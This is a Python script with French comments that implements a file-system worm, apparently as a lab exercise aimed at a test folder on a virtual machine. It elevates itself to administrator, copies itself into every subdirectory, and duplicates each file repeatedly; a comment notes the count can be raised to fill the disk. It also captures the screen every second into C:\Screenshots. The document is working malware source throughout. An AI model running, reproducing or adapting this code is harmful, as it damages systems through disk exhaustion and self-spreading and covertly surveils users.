### - Installer le requirements.txt 
# pip install -r requirements.txt
# et relancer l'interpréteur de code

### - IMPORTATIONS
import os
import shutil
import ctypes, sys
from PIL import ImageGrab
from datetime import datetime
import time

### - VARIABLES

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

#Grande boucle IF qui englobe tout le code pour l'exec en tant qu'admin
if is_admin():

    class Vers:
        #Initialisation 
        def __init__(classVers, path=None, repertoire_cible=None, replication=None):
            # Définit où commencer la recherche de répertoires (la valeur par défaut est définie sur le répertoire racine)
            if isinstance(path, type(None)):
                classVers.path="/"
            else:
                classVers.path = path
            # Possibilitée de transmettre une liste de répertoires cibles initiaux. Par défaut c'est une liste vide []
            if isinstance(repertoire_cible, type(None)):
                classVers.repertoire_cible=[]
            else:
                classVers.repertoire_cible = repertoire_cible
            # Définit le nombre d'instances que le ver créera pour chaque fichier existant dans un répertoire
            if isinstance(repertoire_cible, type(None)):
                classVers.replication = 10
            else:
                classVers.replication = replication

            # Prendre le chemin absolu
            classVers.own_path = os.path.realpath(__file__)
        # Cette fonction va nous permettre d’accéder au contenu des répertoires spécifiés précédemment. C’est-à-dire tous les répertoires et sous-répertoires y contenu.
        def lister_repertoires(classVers, path):
            classVers.repertoire_cible.append(path)
            fichier_dans_le_repertoire = os.listdir(path)

            for file in fichier_dans_le_repertoire:
                # Évite les répertoires / fichiers cachés
                if not file.startswith('.'):
                    # Prends le PATH complet
                    path_absolu = os.path.join(path, file)
                    print(path_absolu)

                    if os.path.isdir(path_absolu):
                        classVers.lister_repertoires(path_absolu)
                    else:
                        pass
        #Fonction de création du vers
        # Permet de répliquer le ver dans les répertoires cibles..
        def creation_vers(classVers):
            for directory in classVers.repertoire_cible:
                destination = os.path.join(directory, "vers.py")
                # Copie le script dans le nouveau répertoire avec un noms similaires
                shutil.copyfile(classVers.own_path, destination)

        def copier_fichiers_existants(classVers):
            # La méthode suivante sera utilisée pour dupliquer les fichiers le nombre de fois la valeur que nous avons de l'argument itération. 
            # Il est possible de mettre un grand nombre pour que le disque dur soit plein.
            for directory in classVers.repertoire_cible:
                file_list_in_dir = os.listdir(directory)
                for file in file_list_in_dir:
                    abs_path = os.path.join(directory, file)
                    if not abs_path.startswith('.') and not os.path.isdir(abs_path):
                        source = abs_path
                        for i in range(classVers.replication):
                            destination = os.path.join(directory,(file+str(i)))
                            shutil.copyfile(source, destination)
        #Créer un répertoire "Screenshot" dans C:\
        def create_directory(classVers):
            repertoire_parent = "C:\\"
            repertoire_a_creer = "Screenshots"
            classVers.fullpath_directory = os.path.join(repertoire_parent, repertoire_a_creer)
            if not os.path.exists(classVers.fullpath_directory):
                os.mkdir(classVers.fullpath_directory)
        #Captures saves dans le répertoire "Screenshot" dans C:\, incrémentées par 1
        def screenshots(classVers):
            i=0
            while True:
                screenshot = ImageGrab.grab()
                filename = (os.path.join(classVers.fullpath_directory, "Screenshot"+str(i+1)+".png"))
                screenshot.save(filename) 
                time.sleep(1)
                i=i+1
        #Fonction de lancement de toutes les fonctions du vers
        def start_vers(classVers):
            classVers.lister_repertoires(classVers.path)
            classVers.creation_vers()
            classVers.copier_fichiers_existants()
            classVers.create_directory()
            classVers.screenshots()

    ######################--TRAITEMENT--######################

    if __name__=="__main__":
        attack_directory = os.path.abspath(r"C:\Users\ADM_VM01\Desktop\TEST FOLDER")
        VersFinal = Vers(path=attack_directory)
        VersFinal.start_vers()

else:
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
